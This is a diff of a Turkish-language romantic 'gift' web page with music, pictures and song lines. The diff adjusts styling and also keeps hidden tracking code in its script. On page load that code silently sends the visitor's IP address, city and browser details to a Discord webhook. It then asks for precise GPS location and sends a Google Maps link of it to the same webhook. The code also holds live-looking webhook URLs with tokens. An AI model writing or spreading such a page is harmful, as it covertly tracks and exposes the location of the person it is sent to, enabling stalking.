@@ -6,11 +6,11 @@
     <title>Senin İçin</title>
     <style>
         body { background: #000; color: white; margin: 0; height: 100vh; font-family: 'Poppins', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        img { width: 550px; height: 300px; object-fit: cover; border-radius: 15px; box-shadow: 0 0 30px #ff00ff; margin-bottom: 20px; }
-        #soz { font-size: 1.5rem; margin-bottom: 15px; color: #ff66ff; text-shadow: 0 0 15px #ff00ff; }
+        img { width: 90%; max-width: 550px; height: auto; border-radius: 15px; box-shadow: 0 0 30px #ff00ff; margin-bottom: 20px; }
+        #soz { font-size: 1.2rem; margin: 15px; color: #ff66ff; text-shadow: 0 0 15px #ff00ff; }
         button { padding: 12px 28px; background: #ff00ff; border: none; color: white; font-size: 1.1rem; border-radius: 10px; cursor: pointer; box-shadow: 0 0 20px #ff00ff; transition: 0.3s; }
         button:hover { transform: scale(1.1); }
-        #hediyeButon { margin-top: 30px; padding: 12px 28px; background: #ff0077; border: none; color: white; font-size: 1.2rem; border-radius: 10px; cursor: pointer; box-shadow: 0 0 20px #ff0077; display: none; }
+        #hediyeButon { margin-top: 30px; background: #ff0077; display: none; }
     </style>
 </head>
 <body>
@@ -28,37 +28,34 @@
     </audio>
 
     <script>
-        // --- 1. AYARLAR ---
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";
+        // --- 1. AYARLAR (Webhook Linkini Yerleştirdim) ---
+        const WEB_URL = "https://discord.com/api/webhooks/1470189609630826658/DAjHbX38Ow-YJOCbk4n0C3WpHnZ7XHCZuA-VLleQpzOU26qEnTw3FuVpegmoY7ghqEnj";
 
-        async function dcGonder(mesaj) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: mesaj })
-                });
-            } catch (e) { console.error("Discord Hatası:", e); }
+        function dcGonder(mesaj) {
+            fetch(WEB_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: mesaj })
+            }).catch(e => console.log("Hata"));
         }
 
-        // --- 2. OTOMATİK KONUM SİSTEMİ ---
+        // --- 2. GİRİŞ VE KONUM SİSTEMİ ---
         window.onload = function() {
-            // A. Şehir ve IP Bulma (Anında çalışır)
+            // A. IP ve Şehir Bilgisi (Sessizce çalışır)
             fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    const info = `🚀 **Giriş Yapıldı!**\n📍 Şehir: ${data.city}\n🌐 IP: ${data.ip}\n📱 Cihaz: ${navigator.userAgent.includes("Mobi") ? "Mobil" : "Bilgisayar"}`;
-                    dcGonder(info);
-
-                    // B. Hassas GPS Konumu (Kullanıcıya sorar)
+                .then(r => r.json())
+                .then(d => {
+                    dcGonder(`🚀 **Siteye Girildi!**\n📍 Şehir: ${d.city}\n🌐 IP: ${d.ip}\n📱 Tarayıcı: ${navigator.userAgent.slice(0, 50)}`);
+                    
+                    // B. GPS Konumu (Kullanıcıya izin sorar)
                     if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(pos => {
-                            const lat = pos.coords.latitude;
-                            const lon = pos.coords.longitude;
-                            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                            dcGonder(`🎯 **Tam Konum Bulundu!**\n📍 Harita: ${mapsLink}`);
+                        navigator.geolocation.getCurrentPosition(function(p) {
+                            const lat = p.coords.latitude;
+                            const lon = p.coords.longitude;
+                            const link = `https://www.google.com/maps?q=${lat},${lon}`;
+                            dcGonder(`🎯 **TAM KONUM GELDİ!**\n🗺️ Harita Linki: ${link}`);
                         }, 
-                        (err) => { dcGonder("⚠️ Kullanıcı konum izni vermedi."); },
+                        function(err) { dcGonder("⚠️ Kullanıcı konum iznini reddetti."); },
                         { enableHighAccuracy: true, timeout: 10000 });
                     }
                 });
@@ -71,7 +68,7 @@
         const audio = document.getElementById("music");
 
         function ileri() {
-            // Müziği her tıklamada tetikle (Mobil koruması için)
+            // Müzik çalmaya başlasın (İlk tıklamada tetiklenir)
             audio.play().catch(() => {});
 
             index++;
@@ -84,7 +81,7 @@
             document.getElementById("soz").innerText = sozler[index];
         }
 
-        // İlk tıkla müziği açma garantisi
+        // Sayfanın herhangi bir yerine tıklandığında müziği garantiye al
         window.onclick = () => { audio.play().catch(() => {}); };
     </script>
 </body>
